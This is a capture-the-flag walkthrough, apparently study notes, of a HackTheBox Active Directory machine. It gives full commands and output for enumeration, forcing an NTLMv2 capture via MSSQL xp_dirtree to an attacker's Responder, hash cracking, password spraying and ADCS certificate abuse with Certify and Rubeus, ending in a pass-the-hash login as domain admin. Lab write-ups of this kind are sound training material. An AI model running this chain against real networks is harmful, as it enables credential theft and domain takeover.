###
Escape – Active Directory Walkthrough
Table of Contents

Machine Summary
1. Enumeration (Recon / Identification)
Nmap Scan
DNS Enumeration

RPC / LDAP
2. SMB Enumeration

Shares & Users
Exploring Public Share
3. MSSQL Access & Enumeration
4. NTLM Capture via MSSQL - https://0xdf.gitlab.io/2023/06/17/htb-escape.html
5. Cracking NTLMv2
6. User Access via WinRM
7. Discovery of Additional Credentials
8. Standard User Access
9. AD Certificate Services (AD CS) Enumeration
10. Abuse AD CS for Domain Admin
11. Rubeus – Obtain TGT / NTLM - https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe
12. Domain Admin Access

Teaching Notes:
Machine Summary
Escape is a Windows Active Directory machine. The goal is to escalate from a low-privilege user or anonymous access to Domain Admin by leveraging:
Weak or public SMB shares
Exposed MSSQL credentials
NTLMv2 hash capture
Misconfigured AD Certificate Services (ADCS)
This box demonstrates the importance of full enumeration and password reuse in AD environments.
###


1-Enummeration:
    └─$ nmap -sV -sC -Pn 10.129.23.243 -v
        PORT      STATE SERVICE       VERSION
        53/tcp    open  domain        Simple DNS Plus
        88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-06 22:04:06Z)
        135/tcp   open  msrpc         Microsoft Windows RPC
        139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
        389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
        | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
        | Issuer: commonName=sequel-DC-CA
        |_ssl-date: 2026-01-06T22:05:36+00:00; +7h59m57s from scanner time.
        445/tcp   open  microsoft-ds?
        464/tcp   open  kpasswd5?
        593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
        636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
        1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
      .....
        9389/tcp  open  mc-nmf        .NET Message Framing
        49667/tcp open  msrpc         Microsoft Windows RPC
        49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
        49690/tcp open  msrpc         Microsoft Windows RPC
        49715/tcp open  msrpc         Microsoft Windows RPC
        49724/tcp open  msrpc         Microsoft Windows RPC
        Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

        Host script results:
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled and required
        | smb2-time: 
        |   date: 2026-01-06T22:04:56
        |_  start_date: N/A
        |_clock-skew: mean: 7h59m56s, deviation: 0s, median: 7h59m55s

        -DC Windows
        -Domain : sequel.htb
        -Key Services : Kerberos, LDAP, SMB, MSSQL, WinRM


    53 DNS:
        dig any sequel.htb @10.129.23.243
            sequel.htb.
            dc.sequel.htb.
    
    135 RCP ACESS DENIED:
        rpcclient -U "" -N 10.129.23.243
            rpcclient $> enumdomusers
                result was NT_STATUS_ACCESS_DENIED


    389 / 636 LDAP:
        enum4linux -u "guest" -p "" 10.129.23.243
            [+] Domain: sequel
            [+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
            [+] Membership: domain member

        ldapServiceName: sequel.htb:dc$@SEQUEL.HTB
        ldapsearch -x -H ldap://10.129.23.243 -b "DC=sequel,DC=htb" "(objectClass=person)" cn

        


    445 SMB :
        └──╼ [★]$ crackmapexec smb 10.129.23.243 -u '' -p '' --shares
            SMB         10.129.23.243   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
            SMB         10.129.23.243   445    DC               [+] sequel.htb\: 
            SMB         10.129.23.243   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

        crackmapexec smb 10.129.23.243  -u '' -p '' --users
            SMB         10.129.23.243   445    DC               [+] sequel.htb\: 

        
        Enumerating Password Policies
            crackmapexec smb 10.129.23.243   -u usertest -p '' --pass-pol

        
        Running the Spider but no results
            crackmapexec smb 10.129.23.243 -u guest -p '' --spider IT --regex .

        
        OK So lets use a random username:
            └──╼ [★]$ crackmapexec smb 10.129.23.243 -u usertest -p '' --shares
                    SMB         10.129.23.243   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
                    SMB         10.129.23.243   445    DC               [+] sequel.htb\usertest: 
                    SMB         10.129.23.243   445    DC               [*] Enumerated shares
                    SMB         10.129.23.243   445    DC               Share           Permissions     Remark
                    SMB         10.129.23.243   445    DC               -----           -----------     ------
                    SMB         10.129.23.243   445    DC               ADMIN$                          Remote Admin
                    SMB         10.129.23.243   445    DC               C$                              Default share
                    SMB         10.129.23.243   445    DC               IPC$            READ            Remote IPC
                    SMB         10.129.23.243   445    DC               NETLOGON                        Logon server share 
                    SMB         10.129.23.243   445    DC               Public          READ            
                    SMB         10.129.23.243   445    DC               SYSVOL                          Logon server share es

            Lets dig into PUBLIC:
                smbclient //10.129.23.243/Public -N

            We found a PDF File:
                └──╼ [★]$ smbclient //10.129.23.243/Public -N
                    smb: \> ls
                    .                                   D        0  Sat Nov 19 05:51:25 2022
                    ..                                  D        0  Sat Nov 19 05:51:25 2022
                    SQL Server Procedures.pdf           A    49551  Fri Nov 18 07:39:43 2022

                
                smb: \> get "SQL Server Procedures.pdf"


            We opened it in ou machine:
                └──╼ [★]$ open SQL\ Server\ Procedures.pdf 

                Rayan, Tom, Brandon

                mailto:brandon.brown@sequel.htb


                Accessing from Domain Joined machine
                    1. Use SQL Management Studio specifying "Windows" authentication which you can donwload here:
                    https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16
                    2. In the "Server Name" field, input the server name.
                    3. Specify "Windows Authentication" and you should be good to go.
                    4. Access the database and make that you need. Everything will be resynced with the Live server overnight.

                Accessing from non domain joined machine:
                    The procedure is the same as the domain joined machine but you need to spawn a command prompt and run the following
                        command: 
                            cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> . 
                    Follow the other steps from above procedure.


                    Bonus
                        For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
                        
                        user PublicUser and password GuestUserCantWrite1
                        
                        Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".        


        MSSQL
            With the creds, We can connect to the MSSQL server. We’ll use the Impacket tool mssqlclient.py:

            mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb

            SQL (PublicUser  guest@master)>  help

            SQL (PublicUser  guest@master)> enum_users
                dbo == db_owner
                guest
                INFORMATION_SCHEMA
                sys

            SQL (PublicUser  guest@master)> enum_db
                master 
                tempdb 
                model 
                msdb

            SQL (PublicUser  guest@master)> xp_cmdshell whoami
                ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.


        New Try but nothing worth it founded:
         └──╼ [★]$ crackmapexec smb 10.129.23.243 -u PublicUser -p 'GuestUserCantWrite1' --users
                SMB         10.129.23.243   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
                SMB         10.129.23.243   445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 
            
            crackmapexec smb 10.129.23.243 -u PublicUser -p 'GuestUserCantWrite1' --sam
        
    
    Get-net-ntlmv2: (https://0xdf.gitlab.io/2023/06/17/htb-escape.html)

        Try is to get the SQL server to connect back to my host and authenticate:
        Capture a challenge / response that I can try to brute force  

    
    In our Machine:
        Start Responder here as root listening on a bunch of services for the tun0 interface:
            └──╼ [★]$ sudo python3 /usr/share/responder/Responder.py -I tun0

    Now I’ll tell MSSQL to read a file on a share on our MAchine:
            SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\10.10.14.160\share', 1, 1

    If we check again on our Responder we get an NTLMV2:
        [SMB] NTLMv2-SSP Client   : 10.129.23.243
        [SMB] NTLMv2-SSP Username : sequel\sql_svc
        [SMB] NTLMv2-SSP Hash     : sql_svc::sequel:584f1cb6ead61c1f:58A2C8CD8B136C48213829B1D3AFC1D8:01010000000000000081A0B3F57EDC01DB8C952A06C6CE9C0000000002000800470036003500580001001E00570049004E002D00390054005900530038005500540034004E004F00390004003400570049004E002D00390054005900530038005500540034004E004F0039002E0047003600350058002E004C004F00430041004C000300140047003600350058002E004C004F00430041004C000500140047003600350058002E004C004F00430041004C00070008000081A0B3F57EDC0106000400020000000800300030000000000000000000000000300000349A8CEEE3B1887FE3CE7FE84D8FF376DB75FAE685A9A5307229FB769B45FBA20A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100360030000000000000000000

    
    Lets use Hashcat to crack NTLMV2:
        ──╼ [★]$ sudo nano ntlm 
                sql_svc::sequel:584f1cb6ead61c1f:58A2 etc..

        └──╼ [★]$ sudo gunzip  /usr/share/wordlists/rockyou.txt.gz


        └──╼ [★]$ hashcat -m 5600 ntlm /usr/share/wordlists/rockyou.txt  --force

                    REGGIE1234ronnie

        sql_svc REGGIE1234ronnie


    First Access to Remote Shell via evil-winrm:
        └──╼ [★]$ evil-winrm -i 10.129.23.243 -u sql_svc -p REGGIE1234ronnie:

        *Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
            sequel\sql_svc

        We found a user named "Ryan.Cooper"


    We found a Log Folder that contain SQL SERVER ERROR LOGS:
        *Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK

            The service account is 'NT Service\MSSQL$SQLMOCK'
            Server name is 'DC\SQLMOCK'
            The SQL Server Network Interface library could not register the Service Principal Name (SPN) [ MSSQLSvc/dc.sequel.htb:SQLMOCK ] for the SQL Server service.
            sequel.htb\Ryan.Cooper
            user 'NuclearMosquito3'

    We create a list of users.txt and try Password Spray Attack:

        └──╼ [★]$ crackmapexec smb 10.129.23.243 -u users.txt -p REGGIE1234ronnie
            SMB         10.129.23.243   445    DC               [+] sequel.htb\NuclearMosquito3:REGGIE1234ronnie 

    "It doesn't works because after reading error logs again:
        It looks like Ryan.Cooper potentially mistyped their password, and the entered the password “NuclearMosquito3” as the username."


    We can enumerate again SMB:
        └──╼ [★]$ crackmapexec smb 10.129.23.243 -u ryan.cooper -p NuclearMosquito3 --users
            SMB         10.129.23.243   445    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
            SMB         10.129.23.243   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                   
            SMB         10.129.23.243   445    DC               Administrator                 2022-11-18 21:13:16 0       Built-in account for administering the computer/domain
            SMB         10.129.23.243   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
            SMB         10.129.23.243   445    DC               krbtgt                        2022-11-18 17:12:10 0       Key Distribution Center Service Account 
            SMB         10.129.23.243   445    DC               Tom.Henn                      2022-11-18 21:13:12 0        
            SMB         10.129.23.243   445    DC               Brandon.Brown                 2022-11-18 21:13:13 0        
            SMB         10.129.23.243   445    DC               Ryan.Cooper                   2023-02-01 21:52:57 0        
            SMB         10.129.23.243   445    DC               sql_svc                       2022-11-18 21:13:13 0        
            SMB         10.129.23.243   445    DC               James.Roberts                 2022-11-18 21:13:13 0        
            SMB         10.129.23.243   445    DC               Nicole.Thompson               2022-11-18 21:13:13 0    

    Password Spray Attack:
        └──╼ [★]$ crackmapexec smb 10.129.23.243 -u users.txt -p passwords.txt 
                SMB         10.129.23.243   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
                SMB         10.129.23.243   445    DC               [-] sequel.htb\Administrator:NuclearMosquito3 STATUS_LOGON_FAILURE 
                SMB         10.129.23.243   445    DC               [-] sequel.htb\Guest:NuclearMosquito3 STATUS_LOGON_FAILURE 
                SMB         10.129.23.243   445    DC               [-] sequel.htb\krbtgt:NuclearMosquito3 STATUS_LOGON_FAILURE 
                SMB         10.129.23.243   445    DC               [-] sequel.htb\Tom.Henn:NuclearMosquito3 STATUS_LOGON_FAILURE 
                SMB         10.129.23.243   445    DC               [-] sequel.htb\Brandon.Brown:NuclearMosquito3 STATUS_LOGON_FAILURE 
                SMB         10.129.23.243   445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 


    So lets use evil-winrm with ryan creds:
        └──╼ [★]$ evil-winrm -i 10.129.23.243 -u ryan.cooper -p NuclearMosquito3

            We catched the first flag


    AD Certificate Enumeration - Identify ADCS:
        One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS)

        └──╼ [★]$ crackmapexec ldap 10.129.23.243 -u ryan.cooper -p NuclearMosquito3 -M adcs
                SMB         10.129.23.243   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
                LDAPS       10.129.23.243   636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
                ADCS        10.129.23.243   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
                ADCS        10.129.23.243   389    DC               Found PKI Enrollment Server: dc.sequel.htb
                ADCS        10.129.23.243   389    DC               Found CN: sequel-DC-CA

    Identify Vulnerable Template
        With ADCS running, the next question is if there are any templates in this ADCS that are insecurely configured. To enumerate further, 
        I’ll upload a copy of Certify by downloading a copy from SharpCollection, and uploading it to Escape:

            https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe

        
    *Evil-WinRM* PS C:\programdata> upload /home/dsk75/Desktop/Certify.exe

    How to enumerate and abuse certificate services
        *Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable /currentuser

        The README for Certify has walkthrough of how to enumerate and abuse certificate services. First it shows running Certify.exe find /vulnerable. By default, this looks across standard low privilege groups. 
        I like to add /currentuser to instead look across the groups for the current user, but both are valuable depending on the scenario.

    The danger here is that sequel\Domain Users has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).


    *Evil-WinRM* PS C:\programdata> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

        New Certificate with ryan.cooper as admin:

            *] Action: Request a Certificates

                [*] Current user context    : sequel\Ryan.Cooper
                [*] No subject name specified, using current context as subject.

                [*] Template                : UserAuthentication
                [*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
                [*] AltName                 : administrator

                [*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

                [*] CA Response             : The certificate had been issued.
                [*] Request ID              : 13

                [*] cert.pem         :

                -----BEGIN RSA PRIVATE KEY-----
                MIIEowIBAAKCAQEAyKbD8PV18Lkdg4hNQWKq2lDEfGZSAEzSXXqRLFEtWBTNaftC
                ....
                TXXcH9gW7nkk/pfmYYLIrY+C7pgfR/5hDQYwDMbieSGLb7sT0YXep2PUzZh0H14x
                G6pekcYv9abkcHoajWWfoK7MB+pscFfYs8P+gDoQBRwqAGv0jznI
                -----END RSA PRIVATE KEY-----
                -----BEGIN CERTIFICATE-----
                MIIGEjCCBPqgAwIBAgITHgAAAA3kTWD6chI1vAAAAAAADTANBgkqhkiG9w0BAQsF
                ..WVs
                MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjYwMTA3MDEzNjMwWhcNMzYwMTA1
                ...
                -----END CERTIFICATE-----


Both the README and the end of that output show the next step. I’ll copy everything from -----BEGIN RSA PRIVATE KEY----- to -----END CERTIFICATE----- into a file on my host and convert it to a .pfx using the command given, entering no password when prompted:

From Our Machine:
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert2.pfx

I’ll upload cert.pfx, as well as a copy of Rubeus (downloaded from SharpCollection), and then run the asktgt command, passing it the certificate to get a TGT as administrator:
Rubeus: https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe

    *Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert2.pfx

It works! However, Rubeus tries to load the returned ticket directly into the current session, so in theory, once I run this I could just enter administrator’s folders and get the flag. 
However, this doesn’t work over Evil-WinRM.
Instead, I’m going to run the same command with /getcredentials /show /nowrap. This will do the same thing, and try to dump credential information about the account:


    *Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert2.pfx /getcredentials /show /nowrap


        NTLM Admin: A52F78E4C751E5F5E17E1E9F3E58F4EE

    Now we can connect as an Admin with thne NTLM Hash:
    └──╼ [★]$ evil-winrm -i 10.129.23.243 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE


There is an alternative way to do it from my attacking machine via Certipy:
Thanks to: https://0xdf.gitlab.io/2023/06/17/htb-escape.html
